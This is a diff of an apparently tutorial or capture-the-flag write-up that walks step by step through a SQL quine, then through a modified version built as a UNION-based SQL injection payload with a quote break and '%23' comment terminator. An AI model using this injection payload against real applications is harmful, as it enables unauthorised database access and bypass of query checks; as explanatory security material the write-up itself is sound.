@@ -45,17 +45,17 @@ An example of a SQL Quine is:
 
 ```sql
 SELECT Replace(Replace(
-'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine',
-char(34),char(39)),char(36),
-'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine')
-AS Quine 
+'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine'
+,char(34),char(39)),char(36),
+'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine'
+) AS Quine 
 ```
 ### Initial string
 
 ```sql
 -- - SELECT Replace(Replace( -- -
 'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine'
--- - char(34),char(39)),char(36),'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine') AS Quine -- -
+-- - ,char(34),char(39)),char(36),'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine') AS Quine -- -
 ```
 ### First replacement
 
@@ -93,10 +93,10 @@ Replace all occurrences of `char(36)` (dollar sign `$` character) with the origi
 ```sql
 -- - SELECT -- -
 'SELECT Replace(Replace(
-\'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine\',
-char(34),char(39)),char(36),
-\'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine\')
-AS Quine'
+\'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine\'
+,char(34),char(39)),char(36),
+\'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine\'
+) AS Quine'
 -- - AS Quine -- -
 ```
 ### Putting it All Together
@@ -106,10 +106,10 @@ The final result of the query is the string after both replacements, as follows:
 ```sql
 SELECT
 'SELECT Replace(Replace(
-\'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine\',
-char(34), char(39)), char(36),
-\'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine\')
-AS Quine'
+\'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine\'
+,char(34),char(39)),char(36),
+\'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine\'
+) AS Quine'
 AS Quine
 ```
 
@@ -117,23 +117,24 @@ When this SQL query is executed, it will produce a single column named `Quine` c
 
 ```sql
 SELECT Replace(Replace(
-'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine',
-char(34), char(39)), char(36),
-'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine')
-AS Quine
+'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine'
+,char(34),char(39)),char(36),
+'SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") AS Quine'
+) AS Quine
 ```
 
 Thus, we can see how the query repeats itself.
 
 &nbsp;
+
 ## Modified Quine
 
 ```sql
 \' UNION SELECT Replace(Replace(
-'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23',
-char(34),char(39)),char(36), 
-'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23')
-%23
+'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23'
+,char(34),char(39)),char(36), 
+'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23'
+)%23
 ```
 ### First replacement
 
@@ -161,7 +162,8 @@ Replace all occurrences of `char(34)` (double quote `"` character) with `ch
 Replace(
 '\' UNION SELECT Replace(Replace(\'$\',char(34),char(39)),char(36),\'$\')%23',
 char(36),
-'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23')
+'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23'
+)
 -- - %23 -- -
 ```
 
@@ -170,10 +172,10 @@ Replace all occurrences of `char(36)` (dollar sign `$` character) with the o
 ```sql
 -- - ' UNION SELECT -- -
 '\' UNION SELECT Replace(Replace(
-\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\',
-char(34),char(39)),char(36),
-\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\')
-%23'
+\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
+,char(34),char(39)),char(36),
+\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
+)%23'
 -- - %23 -- -
 ```
 ### Putting it all together
@@ -183,8 +185,8 @@ The final result of the query is the string after both replacements, as follows:
 ```sql
 \' UNION SELECT 
 '\' UNION SELECT Replace(Replace(
-\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\',
-char(34),char(39)),char(36),
+\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
+,char(34),char(39)),char(36),
 \'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
 )%23'
 %23
@@ -194,8 +196,8 @@ When this SQL query is executed, it will return the following text:
 
 ```sql
 \' UNION SELECT Replace(Replace(
-'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23',
-char(34),char(39)),char(36),
+'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23'
+,char(34),char(39)),char(36),
 '" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23'
 )%23
 ```
